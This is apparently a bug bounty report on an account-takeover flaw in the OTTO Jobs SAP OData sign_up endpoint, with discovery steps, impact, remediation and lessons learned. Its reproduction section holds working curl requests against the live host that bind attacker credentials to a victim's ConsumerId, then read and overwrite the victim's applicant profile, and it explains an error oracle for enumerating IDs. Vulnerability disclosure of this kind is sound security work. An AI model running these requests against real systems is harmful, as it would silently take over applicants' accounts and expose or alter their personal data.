# W-009 — ATO via Unauthenticated Credential Binding to Existing ConsumerId (OTTO Jobs)

**Program:** OTTO Jobs / SAP OData (HackerOne)  
**Asset:** `www.otto.de/jobs` — Medium  
**Severity:** High — CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` = **7.4**  
**CWE:** CWE-620 (Unverified Password Change) / CWE-862 (Missing Authorization)  
**Testing date:** 2026-05-xx

---

## TL;DR

The SAP OData endpoint `POST /or/sap/opu/odata/OTTO/OR2_USER_SRV/sign_up` accepts a client-supplied `ConsumerId` and binds a new set of credentials to the corresponding Consumer — without verifying that the caller owns that account. An attacker who knows a valid ConsumerId can bind their own email/password to it, log in, and get a session with full read/write access to that Consumer's applicant profile in `OR2_PROFILE_SRV` (name, CV, education, employment history, passport data).

---

## Discovery Process

### 1. Observing the registration flow

During account registration at the OTTO Jobs portal, I intercepted the POST request to `sign_up`. The request body included a `ConsumerId` field — a server-assigned numeric ID. I noted that the ConsumerId was also returned in the session cookie `cloud-ogit-rs-consumer-id` after login.

### 2. Testing with a known ConsumerId

I registered Account A, obtained its ConsumerId from the session cookie. Then I called `sign_up` unauthenticated, supplying Account A's ConsumerId with a different email and password (Account B credentials).

The server returned `HTTP 201 Created` — no error, no ownership verification.

### 3. Logging in with Account B

I logged in with Account B's credentials. The session cookie `cloud-ogit-rs-consumer-id` contained Account A's ConsumerId — confirming the binding worked.

### 4. Confirming full profile access

From Account B's session, I sent a PATCH to `ProfileSet('AccountA_ConsumerId')` with arbitrary values. HTTP 204 — accepted. Then a GET to the same endpoint returned the modified data. Full read/write access to Account A's profile was confirmed.

### 5. Verifying the error message oracle

Testing `sign_up` with non-existent ConsumerId `99999999` returned `HTTP 400 "Consumer zur ID 99999999 konnte nicht gefunden werden"` — confirming ConsumerId existence can be probed. A weak-password attempt with a valid ConsumerId returned a password policy error that mentioned the ConsumerId explicitly, confirming the server resolved the account before evaluating the password.

---

## Steps to Reproduce

> All steps use researcher-controlled accounts. No third-party data accessed.

**Step 1 — Obtain a valid ConsumerId (attacker's own account)**

Register at `https://www.otto.de/jobs/de/login/`. After login, the session cookie `cloud-ogit-rs-consumer-id` contains the ConsumerId. In a real attack, the attacker could probe ConsumerIds via the oracle in Step 5.

**Step 2 — Bind attacker credentials to the victim's ConsumerId (no auth)**

```bash
curl -si -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "User-Agent: Mozilla/5.0 ... BugBounty-Hunter" \
  -b "sap-usercontext=sap-client=099" \
  -d '{
    "ConsumerId": [VICTIM_CONSUMER_ID],
    "UserId": "attacker@example.com",
    "Password": "AttackerPassword123!",
    "FirstName": "Test",
    "LastName": "Attacker",
    "Gender": "M",
    "Phone": "",
    "QuestionId": "1",
    "Answer": "testanswer",
    "Language": "de",
    "OnBid": ""
  }' \
  "https://www.otto.de/or/sap/opu/odata/OTTO/OR2_USER_SRV/sign_up"
# → HTTP/2 201
```

No session token or ownership proof was supplied.

**Step 3 — Login with attacker credentials**

Log in at `https://www.otto.de/jobs/de/login/` with `attacker@example.com` + attacker's password.

Session cookie: `cloud-ogit-rs-consumer-id = [VICTIM_CONSUMER_ID]`

**Step 4 — Write to victim's profile**

```bash
curl -si -X PATCH \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "User-Agent: Mozilla/5.0 ... BugBounty-Hunter" \
  -b "WSESSIONID=[ATTACKER_SESSION]; cloud-ogit-rs-consumer-id=[VICTIM_CONSUMER_ID]; sap-usercontext=sap-client=099" \
  -d '{"FirstName":"Modified","LastName":"ByAttacker","BusinessCity":"Hamburg","BusinessCountryCode":"DE"}' \
  "https://www.otto.de/or/sap/opu/odata/OTTO/OR2_PROFILE_SRV/ProfileSet('[VICTIM_CONSUMER_ID]')"
# → HTTP/2 204
```

**Step 5 — Read victim's profile (confirms full access)**

```bash
curl -s \
  -H "Accept: application/json" \
  -H "User-Agent: Mozilla/5.0 ... BugBounty-Hunter" \
  -b "WSESSIONID=[ATTACKER_SESSION]; cloud-ogit-rs-consumer-id=[VICTIM_CONSUMER_ID]" \
  "https://www.otto.de/or/sap/opu/odata/OTTO/OR2_PROFILE_SRV/ProfileSet('[VICTIM_CONSUMER_ID]')"
# → HTTP 200: full profile returned (name, city, CV data, education, employment history)
```

---

## Verification Matrix

| Test | Input | Result |
|------|-------|--------|
| `sign_up` with existing ConsumerId | Different email + password, no auth | HTTP 201 |
| `sign_up` with non-existent ConsumerId | Any credentials | HTTP 400 — "Consumer nicht gefunden" |
| `sign_up` with valid ConsumerId + weak password | — | HTTP 400 — mentions ConsumerId in policy error (oracle) |
| Login as Account B | Attacker credentials | Cookie = victim's ConsumerId |
| PATCH `ProfileSet` via attacker session | Arbitrary values | HTTP 204 — write accepted |
| GET `ProfileSet` via attacker session | — | HTTP 200 — modified data returned |

---

## Impact

The attacker obtains a session bound to the victim's ConsumerId with full access to `OR2_PROFILE_SRV`. This includes:
- **Read:** Full applicant profile — personal information, CV, education history, employment history, awards, language skills, web profiles, project history.
- **Write:** Can overwrite all fields. Original owner's credentials remain valid (no lockout), and no notification is sent — access is silent.

**CVSS rationale:**
- `AC:H`: Requires a valid ConsumerId for a third-party Consumer. However, ConsumerId existence is probeable via the error message oracle, and IDs appear sequential.
- `PR:N`: `sign_up` requires no authentication.
- `C:H` + `I:H`: Full read and write access to the applicant profile demonstrated.

---

## Remediation

1. **Primary:** The `sign_up` endpoint must reject requests where the `ConsumerId` already has registered credentials. If a UserId already exists for that Consumer, return an error — do not bind new credentials.
2. **Secondary:** `ConsumerId` should not be client-supplied. Generate it server-side during registration and bind it to the registration session, preventing callers from targeting arbitrary Consumers.
3. **Error hardening:** The password policy error message discloses the ConsumerId in the error text. Use a uniform error response regardless of ConsumerId state to remove this oracle.

---

## Lessons Learned

- **Client-supplied resource identifiers in registration endpoints are high risk.** Any `sign_up`-style endpoint that accepts an existing resource ID from an unauthenticated caller should be treated as a credential binding endpoint and tested for ownership verification.
- **SAP OData has its own conventions.** OData endpoints often follow predictable URL patterns (`EntitySet('{id}')`) and expose a broader surface than REST APIs — worth exploring systematically.
- **Error messages that mention the resource ID are oracles.** A "password policy" error that names a ConsumerId confirms the account exists. A "not found" error confirms it doesn't. This turns a binary condition into a full account enumeration vector.
- **The victim's original credentials remaining valid** is both the privacy impact (silent access) and a clue for detection. Monitoring for multiple credential sets bound to the same resource ID would catch this class of attack.
